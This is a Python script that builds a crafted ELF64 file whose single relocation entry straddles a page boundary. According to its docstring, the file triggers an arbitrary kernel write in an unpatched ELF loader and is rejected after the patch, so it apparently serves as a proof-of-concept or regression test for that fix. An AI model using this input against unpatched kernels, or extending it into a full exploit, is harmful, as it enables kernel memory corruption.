#!/usr/bin/env python3
"""Generate a minimal PIE ELF64 with a single R_X86_64_RELATIVE entry whose
r_offset places the 8-byte write across a page boundary. Pre-patch,
applyRelocations writes into the physmap of the PHYSICALLY-adjacent frame
— an arbitrary kernel write. Post-patch, loadElf rejects with InvalidElf.

The ELF is minimal but valid: ELF64 header, one PT_LOAD PHDR covering a
single page of code (a `ud2` halt), and section headers containing a
.rela.dyn with one entry.
"""
import struct

PAGE = 0x1000

code = b"\x0f\x0b" + b"\x00" * (PAGE - 2)

EHDR_SIZE = 64
PHDR_SIZE = 56
SHDR_SIZE = 64
RELA_SIZE = 24

phdr_off = EHDR_SIZE
rela_off = phdr_off + PHDR_SIZE
shdr_off = rela_off + RELA_SIZE
code_off = PAGE

ehdr = b""
ehdr += b"\x7fELF"
ehdr += b"\x02"
ehdr += b"\x01"
ehdr += b"\x01"
ehdr += b"\x00"
ehdr += b"\x00" * 8
ehdr += struct.pack("<H", 3)
ehdr += struct.pack("<H", 62)
ehdr += struct.pack("<I", 1)
ehdr += struct.pack("<Q", code_off + 0x0FFE)
ehdr += struct.pack("<Q", phdr_off)
ehdr += struct.pack("<Q", shdr_off)
ehdr += struct.pack("<I", 0)
ehdr += struct.pack("<H", EHDR_SIZE)
ehdr += struct.pack("<H", PHDR_SIZE)
ehdr += struct.pack("<H", 1)
ehdr += struct.pack("<H", SHDR_SIZE)
ehdr += struct.pack("<H", 3)
ehdr += struct.pack("<H", 0)
assert len(ehdr) == EHDR_SIZE

phdr = b""
phdr += struct.pack("<I", 1)
phdr += struct.pack("<I", 5)
phdr += struct.pack("<Q", code_off)
phdr += struct.pack("<Q", code_off)
phdr += struct.pack("<Q", code_off)
phdr += struct.pack("<Q", PAGE)
phdr += struct.pack("<Q", PAGE)
phdr += struct.pack("<Q", PAGE)
assert len(phdr) == PHDR_SIZE

R_X86_64_RELATIVE = 8
rela = b""
rela += struct.pack("<Q", code_off + 0x0FFC)
rela += struct.pack("<Q", R_X86_64_RELATIVE)
rela += struct.pack("<q", 0xDEADBEEF)
assert len(rela) == RELA_SIZE

def shdr(name, type_, flags, addr, offset, size, link, info, align, entsize):
    return struct.pack("<IIQQQQIIQQ", name, type_, flags, addr, offset, size, link, info, align, entsize)

SHT_NULL   = 0
SHT_PROGBITS = 1
SHT_RELA   = 4

sh_null = shdr(0, SHT_NULL, 0, 0, 0, 0, 0, 0, 0, 0)
sh_text = shdr(0, SHT_PROGBITS, 6, code_off, code_off, PAGE, 0, 0, 16, 0)
sh_rela = shdr(0, SHT_RELA, 0, 0, rela_off, RELA_SIZE, 0, 0, 8, RELA_SIZE)

out = bytearray(code_off + PAGE)
out[0:EHDR_SIZE] = ehdr
out[phdr_off:phdr_off + PHDR_SIZE] = phdr
out[rela_off:rela_off + RELA_SIZE] = rela
out[shdr_off:shdr_off + SHDR_SIZE * 3] = sh_null + sh_text + sh_rela
out[code_off:code_off + PAGE] = code

with open("p1_bad.elf", "wb") as f:
    f.write(bytes(out))
print(f"wrote p1_bad.elf ({len(out)} bytes)")
